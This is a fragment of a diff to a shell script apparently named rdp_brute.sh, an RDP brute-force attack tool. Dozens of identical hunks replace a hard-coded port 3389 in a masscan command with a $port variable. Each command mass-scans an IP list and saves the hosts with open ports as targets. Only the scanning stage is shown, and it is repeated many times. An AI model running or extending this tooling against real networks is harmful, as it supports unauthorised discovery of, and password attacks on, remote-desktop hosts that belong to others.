@@ -13636,7 +13640,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -13682,7 +13686,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -13728,7 +13732,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -13774,7 +13778,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -13819,7 +13823,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -13865,7 +13869,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -13911,7 +13915,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -13957,7 +13961,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -14003,7 +14007,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -14049,7 +14053,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -14095,7 +14099,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -14141,7 +14145,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -14187,7 +14191,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -14233,7 +14237,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -14279,7 +14283,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -14325,7 +14329,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -14371,7 +14375,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -14417,7 +14421,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -14463,7 +14467,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -14509,7 +14513,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -14555,7 +14559,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -14600,7 +14604,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -14645,7 +14649,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -14691,7 +14695,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -14737,7 +14741,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -14783,7 +14787,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -14829,7 +14833,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -14875,7 +14879,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -14921,7 +14925,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -14967,7 +14971,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -15013,7 +15017,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -15059,7 +15063,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -15105,7 +15109,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -15150,7 +15154,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -15195,7 +15199,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -15241,7 +15245,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -15287,7 +15291,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -15333,7 +15337,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -15379,7 +15383,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -15425,7 +15429,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -15471,7 +15475,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -15517,7 +15521,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -15563,7 +15567,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -15609,7 +15613,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -15655,7 +15659,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -15701,7 +15705,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -15747,7 +15751,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -15793,7 +15797,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -15839,7 +15843,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -15885,7 +15889,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -15931,7 +15935,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -15976,7 +15980,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -16022,7 +16026,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -16068,7 +16072,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -16114,7 +16118,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -16160,7 +16164,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -16206,7 +16210,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -16252,7 +16256,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -16297,7 +16301,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -16343,7 +16347,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -16389,7 +16393,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -16435,7 +16439,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -16481,7 +16485,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
